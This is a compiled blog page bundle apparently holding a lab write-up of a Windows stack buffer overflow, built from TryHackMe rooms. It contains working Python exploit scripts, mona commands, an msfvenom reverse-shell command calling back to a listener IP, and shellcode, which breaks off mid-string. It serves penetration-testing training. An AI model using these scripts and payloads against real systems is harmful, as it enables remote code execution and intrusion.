"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[92690],{16153:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>x,default:()=>c,frontMatter:()=>r,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"hacker/bufferoverflow/windows","title":"Windows x86-64 Buffer Overflow Exploitation Guide","description":"Complete guide to Windows buffer overflow exploitation using Immunity Debugger and Mona. Learn stack-based buffer overflow techniques for penetration testing.","source":"@site/docs/hacker/bufferoverflow/1.windows.md","sourceDirName":"hacker/bufferoverflow","slug":"/hacker/bufferoverflow/windows","permalink":"/docs/hacker/bufferoverflow/windows","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/bufferoverflow/1.windows.md","tags":[{"inline":true,"label":"buffer-overflow","permalink":"/docs/tags/buffer-overflow"},{"inline":true,"label":"exploitation","permalink":"/docs/tags/exploitation"},{"inline":true,"label":"windows","permalink":"/docs/tags/windows"},{"inline":true,"label":"pentest","permalink":"/docs/tags/pentest"},{"inline":true,"label":"exploit-dev","permalink":"/docs/tags/exploit-dev"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1771617957000,"sidebarPosition":1,"frontMatter":{"title":"Windows x86-64 Buffer Overflow Exploitation Guide","description":"Complete guide to Windows buffer overflow exploitation using Immunity Debugger and Mona. Learn stack-based buffer overflow techniques for penetration testing.","keywords":["buffer overflow","windows exploitation","immunity debugger","mona","penetration testing","exploit development","x86-64","stack overflow"],"tags":["buffer-overflow","exploitation","windows","pentest","exploit-dev"],"sidebar_position":1},"sidebar":"docsSidebar","previous":{"title":"Cryptography and Decoding Techniques for CTF and Penetration Testing","permalink":"/docs/hacker/HowToDecodeStuff"},"next":{"title":"Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide","permalink":"/docs/hacker/bufferoverflow/x86"}}');var o=t(74848),a=t(28453);const r={title:"Windows x86-64 Buffer Overflow Exploitation Guide",description:"Complete guide to Windows buffer overflow exploitation using Immunity Debugger and Mona. Learn stack-based buffer overflow techniques for penetration testing.",keywords:["buffer overflow","windows exploitation","immunity debugger","mona","penetration testing","exploit development","x86-64","stack overflow"],tags:["buffer-overflow","exploitation","windows","pentest","exploit-dev"],sidebar_position:1},x=void 0,i={},l=[{value:"The Setup",id:"the-setup",level:2},{value:"The Process",id:"the-process",level:2},{value:"Fuzz the Program",id:"fuzz-the-program",level:2},{value:"fuzzer.py",id:"fuzzerpy",level:3},{value:"Find the Offset",id:"find-the-offset",level:2},{value:"offset.py",id:"offsetpy",level:3},{value:"Using Mona",id:"using-mona",level:3},{value:"Using Metasploit",id:"using-metasploit",level:3},{value:"Control the EIP",id:"control-the-eip",level:2},{value:"Bad Character Check",id:"bad-character-check",level:2},{value:"!mona bytearray",id:"mona-bytearray",level:3},{value:"badchar.py",id:"badcharpy",level:3},{value:"!mona compare",id:"mona-compare",level:3},{value:"verify",id:"verify",level:3},{value:"Find a jmp point",id:"find-a-jmp-point",level:2},{value:"Shellcode",id:"shellcode",level:2},{value:"msfvenom",id:"msfvenom",level:3},{value:"payload.py",id:"payloadpy",level:3},{value:"listener + pop",id:"listener--pop",level:3},{value:"References",id:"references",level:2}];function d(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",em:"em",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.admonition,{type:"info",children:(0,o.jsxs)(n.p,{children:["Notes from TryHackMe's ",(0,o.jsx)(n.code,{children:"Brainstorm"})," and ",(0,o.jsx)(n.code,{children:"BufferOverflowPrep"})," Rooms."]})}),"\n",(0,o.jsx)(n.h2,{id:"the-setup",children:"The Setup"}),"\n",(0,o.jsx)(n.p,{children:"When you have a blind target to buffer overflow, you need to set up a local system to model the target and use it to design and develop your overflow."}),"\n",(0,o.jsx)(n.p,{children:"The windows setup I used is:"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:"A Windows 7 VM"}),"\n",(0,o.jsx)(n.li,{children:"Immunity Debugger installation"}),"\n",(0,o.jsx)(n.li,{children:"Mona modules python scripts for the debugger"}),"\n"]}),"\n",(0,o.jsx)(n.h2,{id:"the-process",children:"The Process"}),"\n",(0,o.jsx)(n.admonition,{type:"tip",children:(0,o.jsxs)(n.p,{children:["Big thank you to ",(0,o.jsx)(n.a,{href:"https://www.youtube.com/channel/UC0ArlFuFYMpEewyRBzdLHiw",children:"The Cyber Mentor"})," who's ",(0,o.jsx)(n.a,{href:"https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G",children:'"Buffer Overflows Made Easy"'})," YouTube playlist was the most well explained video series I found at the time."]})}),"\n",(0,o.jsx)(n.p,{children:"This has been written up far better in a lot of places, but for my own notes and understanding I will write it out in the best way that makes sense to me."}),"\n",(0,o.jsx)(n.p,{children:"The steps are:"}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsx)(n.li,{children:"Fuzz the Program"}),"\n",(0,o.jsx)(n.li,{children:"Find the Offset"}),"\n",(0,o.jsx)(n.li,{children:"Control the EIP"}),"\n",(0,o.jsx)(n.li,{children:"Bad Character Check"}),"\n",(0,o.jsx)(n.li,{children:"find a module"}),"\n",(0,o.jsx)(n.li,{children:"create shellcode"}),"\n",(0,o.jsx)(n.li,{children:"exploit"}),"\n"]}),"\n",(0,o.jsx)(n.h2,{id:"fuzz-the-program",children:"Fuzz the Program"}),"\n",(0,o.jsx)(n.p,{children:"The scenario would be once you've found a function in the program that you may be able to overflow, you start sending it incrementally-increasing payloads and watch how many bytes it takes to crash."}),"\n",(0,o.jsx)(n.h3,{id:"fuzzerpy",children:"fuzzer.py"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",metastring:'title="fuzzer.py"',children:'#!/usr/bin/env python3\n\nimport socket, time, sys\n\nip = "172.16.2.125" # the target server IP\n\nport = 9999 # port the vulnerable program is listening on\ntimeout = 5\n\npayload = "A" * 100 # the start size for the payload\n\nwhile True:\n  try:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n      s.settimeout(timeout)\n      s.connect((ip, port))\n      s.recv(1024)\n      print("Fuzzing with {} bytes".format(len(payload) - len(prefix)))\n      s.send(bytes(payload, "latin-1"))\n      s.recv(1024)\n  except:\n    print("Fuzzing crashed at {} bytes".format(len(payload) - len(prefix)))\n    sys.exit(0)\n  payload += 100 * "A" # increment the payload by 100 x A\'s\n  time.sleep(1)\n'})}),"\n",(0,o.jsxs)(n.p,{children:["Eventually the program will stop responding and timeout and our script will write ",(0,o.jsx)(n.code,{children:'"Fuzzing crashed at x bytes"'})," and we will have roughly our payload size that crashes the program."]}),"\n",(0,o.jsx)(n.h2,{id:"find-the-offset",children:"Find the Offset"}),"\n",(0,o.jsxs)(n.p,{children:["We know the payload size from the fuzzer, now we create a random string of ",(0,o.jsx)(n.code,{children:"x"})," length as our new payload."]}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.em,{children:"Why?"}),' Because we want to find the number of bytes it takes from the bottom of our buffer, to the beginning of the EIP address- this "distance" is the offset. If we know the offset, we know how many bytes to use up in the payload before the return address so that it gets written perfectly over the EIP.']}),"\n",(0,o.jsx)(n.p,{children:"We use 2 x tools from metasploit to find the offset:"}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.code,{children:"pattern_create.rb"})," - to create a string pattern the length found by the fuzzer."]}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.code,{children:"pattern_offset.rb"})," - find the offset within that pattern given the specific segment of that pattern that was overwritten onto the EIP."]}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:"For example..."}),"\n",(0,o.jsxs)(n.p,{children:["let's say ",(0,o.jsx)(n.code,{children:"Fuzzing crashed at 6300 bytes."})]}),"\n",(0,o.jsxs)(n.p,{children:["pattern create: ",(0,o.jsx)(n.code,{children:"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6700"})]}),"\n",(0,o.jsx)(n.h3,{id:"offsetpy",children:"offset.py"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125" # IP of the target server.\nport = 9999\n\noffset = 0 \noverflow = "A" * offset\nretn = "" # this will overwrite the EIP\npadding = "" # optional.\npayload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0A..."\npostfix = "" # optional\n\nbuffer = overflow + retn + padding + payload + postfix\n\nprint("buffer=",len(buffer))\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("Sending evil buffer...")\n  s.send(bytes(payload + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n'})}),"\n",(0,o.jsx)(n.p,{children:"When the program crashes you have two ways of finding the offset"}),"\n",(0,o.jsx)(n.h3,{id:"using-mona",children:"Using Mona"}),"\n",(0,o.jsxs)(n.p,{children:["In the Immunity Debugger, run this to find offset via mona: ",(0,o.jsx)(n.code,{children:"!mona findmsp -distance 6700"})]}),"\n",(0,o.jsx)(n.p,{children:"Output will look like this:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-sh",children:"Log data, item 18\n Address=0BADF00D\n Message=    EIP contains normal pattern : 0x48367648 (offset 6108)\n"})}),"\n",(0,o.jsx)(n.h3,{id:"using-metasploit",children:"Using Metasploit"}),"\n",(0,o.jsxs)(n.p,{children:["Or use the 2nd part of the the metasploit pattern tool, the ",(0,o.jsx)(n.code,{children:"pattern_offset"})," script:"]}),"\n",(0,o.jsx)(n.p,{children:"First, read the EIP value in Immunity Debugger:"}),"\n",(0,o.jsxs)(n.p,{children:["e.g. EIP value on crash = ",(0,o.jsx)(n.code,{children:"48367648"})]}),"\n",(0,o.jsx)(n.p,{children:"Then use the pattern offset tool from metasploit to find the offset:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-sh",children:"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q 48367648\nExact match at offset 6108\n"})}),"\n",(0,o.jsx)(n.h2,{id:"control-the-eip",children:"Control the EIP"}),"\n",(0,o.jsxs)(n.p,{children:["Now that you know the offset, theoretically you should be able to create an ",(0,o.jsx)(n.code,{children:"overflow"})," of length=offset which will fill the buffer right up to the start of the EIP, and then the value you set for ",(0,o.jsx)(n.code,{children:"retn"})," should be written over the EIP, which in the case below is 4 x B's i.e. ",(0,o.jsx)(n.code,{children:"BBBB"}),"."]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",metastring:'title="eip.py"',children:'\n#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125"\nport = 9999\n\noffset = 6108\noverflow = "A" * offset\nretn = "BBBB"\n\nbuffer = overflow + retn\nprint("buffer=",len(buffer)) # check the buffer length\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("Crash Overwrite EIP: 42424242...")\n  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n'})}),"\n",(0,o.jsxs)(n.p,{children:["If your fuzz and offset work is correct, when you run the ",(0,o.jsx)(n.code,{children:"eip.py"})," script and the application crashes, the EIP value should show ",(0,o.jsx)(n.code,{children:"42424242"})," i.e. 4 x B's."]}),"\n",(0,o.jsx)(n.h2,{id:"bad-character-check",children:"Bad Character Check"}),"\n",(0,o.jsxs)(n.blockquote,{children:["\n",(0,o.jsx)(n.p,{children:"Why do we care?"}),"\n"]}),"\n",(0,o.jsxs)(n.p,{children:["A bad character in our shellcode will bork the whole thing up, so we need to understand which characters from a ",(0,o.jsx)(n.code,{children:"byte array"})," of all possible characters, could be bad and mess up our exploit so we can exclude them from any generated shellcode."]}),"\n",(0,o.jsx)(n.p,{children:"First, because we're going to use mona a lot here, setup the mona working directory to make things easier for us:"}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.code,{children:"!mona config -set workingfolder C:\\Users\\IEUser\\Downloads\\%p"})," - this is my win7 VM."]}),"\n",(0,o.jsx)(n.h3,{id:"mona-bytearray",children:"!mona bytearray"}),"\n",(0,o.jsxs)(n.p,{children:["In Immunity Debugger, run this mona command: ",(0,o.jsx)(n.code,{children:'!mona bytearray -b "\\x00"'}),' to generate the "nullbyte array" i.e. the full bytearray minus the null byte ',(0,o.jsx)(n.code,{children:"\\x00"}),"."]}),"\n",(0,o.jsxs)(n.p,{children:["You can find the text file of the byte array to copy in the working directory we set just before (",(0,o.jsx)(n.code,{children:"C:\\Users\\IEUser\\Downloads\\%p"}),"), if you want to open + copy/paste to your script below."]}),"\n",(0,o.jsx)(n.p,{children:"Other ways of generating all possible characters:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-sh",children:"# Python\nfor i in range(0,256): print('\\\\x%02X' % i, end='')\n\n# Bash\nfor i in {0..255}; do printf \"\\\\\\x%02x\" $i;done\n"})}),"\n",(0,o.jsx)(n.h3,{id:"badcharpy",children:"badchar.py"}),"\n",(0,o.jsx)(n.p,{children:"Your bad character script looks like this:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",metastring:'title="badchar.py"',children:'\n#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125"\nport = 9999\n\noffset = 6108\noverflow = "A" * offset\nretn = "BBBB"\npayload = (\n"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21"\n"\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x41\\x42"\n"\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x60\\x61\\x62\\x63"\n"\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83"\n"\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3"\n"\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4"\n"\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4"\n"\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"\n)\n\nbuffer = overflow + retn + payload\n\nprint("buffer=",len(buffer)) # check the buffer length\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("Sending evil buffer for badchar check...")\n  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n'})}),"\n",(0,o.jsxs)(n.p,{children:["When you send this payload ",(0,o.jsx)(n.code,{children:"./badchar.py"}),' and crash the app, use mona again to run a "compare" between the ',(0,o.jsx)(n.code,{children:"bytearray.bin"})," you generated at the beginning with ",(0,o.jsx)(n.code,{children:'!mona bytearray -b "\\x00"'})," and the array that's now in memory starting where the ESP is pointing."]}),"\n",(0,o.jsx)(n.h3,{id:"mona-compare",children:"!mona compare"}),"\n",(0,o.jsx)(n.p,{children:"The steps are as follows:"}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsx)(n.li,{children:"Send the payload with the bytearray you generated and crash the app"}),"\n",(0,o.jsxs)(n.li,{children:["Read the value of the ",(0,o.jsx)(n.code,{children:"ESP"})," register e.g. ",(0,o.jsx)(n.code,{children:"01ACFA30"})]}),"\n",(0,o.jsxs)(n.li,{children:["Run the ",(0,o.jsx)(n.code,{children:"!mona compare"})," command using: ",(0,o.jsx)(n.code,{children:"!mona compare -f C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\bytearray.bin -a 01ACFA30"})]}),"\n",(0,o.jsxs)(n.li,{children:['mona will give you a list of characters it believes are "bad", and look something like this: ',(0,o.jsx)(n.code,{children:"00 a0 a1 ad ae be bf de df ef f0"})]}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:"You now have your bad characters list."}),"\n",(0,o.jsx)(n.h3,{id:"verify",children:"verify"}),"\n",(0,o.jsx)(n.p,{children:"Not all characters in mona's bad character list are legitimate bad chars."}),"\n",(0,o.jsxs)(n.blockquote,{children:["\n",(0,o.jsx)(n.p,{children:"How do we verify?"}),"\n"]}),"\n",(0,o.jsx)(n.admonition,{title:"Rule of Thumb",type:"tip",children:(0,o.jsxs)(n.p,{children:['The "next byte" after a badchar can get corrupted, so the real badchar will only be the FIRST in any consecutive characters e.g. if mona says ',(0,o.jsx)(n.code,{children:"1 2 3 4 5 6"})," are bad chars, really the real badchars are ",(0,o.jsx)(n.code,{children:"1 3 5"})," because ",(0,o.jsx)(n.code,{children:"2 4 6"})," would be fine and just got corrupted by the ",(0,o.jsx)(n.em,{children:"real"})," bad characters that came before it."]})}),"\n",(0,o.jsxs)(n.p,{children:["For example, say after a compare mona gives us this list of bad chars: ",(0,o.jsx)(n.code,{children:"00 a0 a1 ad ae be bf de df ef f0"}),"."]}),"\n",(0,o.jsxs)(n.p,{children:["We apply our rule of thumb, and guess that only the following from the sequence are the ",(0,o.jsx)(n.em,{children:"real"})," bad characters: ",(0,o.jsx)(n.code,{children:"a0 ad be de ef"})]}),"\n",(0,o.jsxs)(n.p,{children:["We test this by generating another byte array using mona, but adding the other bytes we want to exclude from our ",(0,o.jsx)(n.em,{children:"real"})," bad character list:"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.code,{children:'!mona bytearray -b "\\x00\\xa0\\xad\\xbe\\xde\\xef"'})}),"\n",(0,o.jsx)(n.p,{children:"And go through the same steps 1 to 4 above."}),"\n",(0,o.jsxs)(n.p,{children:['If our guess is correct, we will get an "',(0,o.jsx)(n.code,{children:"Unmodified"}),'" status which means our byte array payload has no bad characters in it.']}),"\n",(0,o.jsx)(n.h2,{id:"find-a-jmp-point",children:"Find a jmp point"}),"\n",(0,o.jsx)(n.admonition,{type:"info",children:(0,o.jsx)(n.p,{children:(0,o.jsxs)(n.em,{children:["Read: ",(0,o.jsx)(n.a,{href:"https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/",children:"mona manual"})]})})}),"\n",(0,o.jsx)(n.p,{children:'We have control of the EIP so we can write an address over it to "jump somewhere and execute" code, so we need to find this return address of a pointer that will allow us to use it to "jump" where we want to go.'}),"\n",(0,o.jsx)(n.p,{children:'I use the word "allow" because the return address of the module we\'re trying to jump from has to have any protections disabled or missing.'}),"\n",(0,o.jsx)(n.p,{children:'The command we can use to find all available "pointers", for example:'}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.code,{children:'!mona jmp -r esp -cpb "\\x00\\xa0\\xad\\xbe\\xde\\xef"'})}),"\n",(0,o.jsxs)(n.p,{children:["this command tells ",(0,o.jsx)(n.code,{children:"mona"})," to:"]}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsxs)(n.li,{children:["look for ",(0,o.jsx)(n.code,{children:"jmp"})," instructions pointers"]}),"\n",(0,o.jsxs)(n.li,{children:["given the register ",(0,o.jsx)(n.code,{children:"esp"})]}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.code,{children:"-cpb"})," and skip any pointers that have any of these bad characters ",(0,o.jsx)(n.code,{children:'"\\x00\\xa0\\xad\\xbe\\xde\\xef"'})]}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:'Run the command in Immunity Debugger and you see something like this ("Log Data" window):'}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-sh",children:"           ---------- Mona command started on 2022-01-13 04:36:15 (v2.0, rev 605) ----------\n0BADF00D   [+] Processing arguments and criteria\n0BADF00D       - Pointer access level : X\n0BADF00D       - Bad char filter will be applied to pointers : \"\\x00\\xa0\\xad\\xbe\\xde\\xef\"\n0BADF00D   [+] Generating module info table, hang on...\n0BADF00D       - Processing modules\n0BADF00D       - Done. Let's rock 'n roll.\n0BADF00D   [+] Querying 2 modules\n0BADF00D       - Querying module essfunc.dll\n74840000   Modules C:\\Windows\\System32\\wshtcpip.dll\n0BADF00D       - Querying module oscp.exe\n0BADF00D       - Search complete, processing results\n0BADF00D   [+] Preparing output file 'jmp.txt'\n0BADF00D       - (Re)setting logfile C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\jmp.txt\n0BADF00D   [+] Writing results to C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\jmp.txt\n0BADF00D       - Number of pointers of type 'jmp esp' : 9\n0BADF00D   [+] Results :\n625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll)\n625011BB     0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll)\n625011C7     0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll)\n625011D3     0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll)\n625011DF     0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll)\n625011EB     0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll)\n625011F7     0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll)\n62501203     0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll)\n62501205     0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll)\n0BADF00D       Found a total of 9 pointers\n0BADF00D\n0BADF00D   [+] This mona.py action took 0:00:00.702000\n"})}),"\n",(0,o.jsxs)(n.p,{children:["mona found ",(0,o.jsx)(n.code,{children:"9 pointers"})," that fit our criteria."]}),"\n",(0,o.jsxs)(n.p,{children:["Pick a jmp point = ",(0,o.jsx)(n.code,{children:"625011F7"})," and convert to little endian format: ",(0,o.jsx)(n.code,{children:"\\xf7\\x11\\x50\\x62"})]}),"\n",(0,o.jsx)(n.h2,{id:"shellcode",children:"Shellcode"}),"\n",(0,o.jsx)(n.p,{children:"Now that we have our return address for our pointer jmp point, we can put the final piece of the payload together- the shellcode."}),"\n",(0,o.jsx)(n.h3,{id:"msfvenom",children:"msfvenom"}),"\n",(0,o.jsxs)(n.p,{children:["Use ",(0,o.jsx)(n.code,{children:"msfvenom"})," to generate a reverse tcp shell to pop a connection back to your listener:"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.code,{children:'msfvenom -p windows/shell_reverse_tcp LHOST=10.11.55.83 LPORT=4444 EXITFUNC=thread -b "\\x00\\xa0\\xad\\xbe\\xde\\xef" -f c'})}),"\n",(0,o.jsx)(n.h3,{id:"payloadpy",children:"payload.py"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",metastring:'title="payload.py"',children:'#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125"\nport = 9999\n\noffset = 6108\noverflow = "A" * offset\nretn = "\\xf7\\x11\\x50\\x62" # found using mona\npadding = "\\x90" * 16 # NOP sled\nshellcode = (\n"\\x33\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e"\n"\\xa4\\xa6\\x8c\\x59\\x83\\xee\\xfc\\xe2\\xf4\\x58\\x4e\\x0e\\x59\\xa4\\xa6"\n"\\xec\\xd0\\x41\\x97\\x4c\\x3d\\x2f\\xf6\\xbc\\xd2\\xf6\\xaa\\x07\\x0b\\xb0"\n"\\x2d\\xfe\\x71\\xab\\x11\\xc6\\x7f\\x95\\x59\\x20\\x65\\xc5\\xda\\x8e\\x75"\n"\\x84\\x67\\x43\\x54\\xa5\\x61\\x6e\\xab\\xf6\\xf1\\x07\\x0b\\xb4\\x2d\\xc6"\n"\\x65\\x2f\\xea\\x9d\\x21\\x47\\xee\\x8d\\x88\\xf5\\x2d\\xd5\\x79\\xa5\\x75"\n"\\x07\\x10\\xbc\\x45\\xb6\\x10\\x2f\\x92\\x07\\x58\\x72\\x97\\x73\\xf5\\x65"\n"\\x69\\x81\\x58\\x63\\x9e\\x6c\\x2c\\x52\\xa5\\xf1\\xa1\\x9f\\xdb\\xa8\\x2c"\n"\\x40\\xfe\\x07\\x01\\x80\\xa7\\x5f\\x3f\\x2f\\xaa\\xc7\\xd2\\xfc\\xba\\x8d"\n"\\x8a\\x2f\\xa2\\x07\\x58\\x74\\x2f\\xc8\\x7d\\x80\\xfd\\xd7\\x38\\xfd\\xfc"\n"\\xdd\\xa6\\x44\\xf9\\xd3\\x03\\x2f\\xb4\\x67\\xd4\\xf9\\xce\\xbf\\x6b\\xa4"\n"\\xa6\\xe4\\x2e\\xd7\\x94\\xd3\\x0d\\xcc\\xea\\xfb\\x7f\\xa3\\x59\\x59\\xe1"\n"\\x34\\xa7\\x8c\\x59\\x8d\\x62\\xd8\\x09\\xcc\\x8f\\x0c\\x32\\xa4\\x59\\x59"\n"\\x09\\xf4\\xf6\\xdc\\x19\\xf4\\xe6\\xdc\\x31\\x4e\\xa9\\x53\\xb9\\x5b\\x73"\n"\\x1b\\x33\\xa1\\xce\\x86\\x52\\x93\\xf5\\xe4\\x5b\\xa4\\xb7\\xd0\\xd0\\x42"\n"\\xcc\\x9c\\x0f\\xf3\\xce\\x15\\xfc\\xd0\\xc7\\x73\\x8c\\x21\\x66\\xf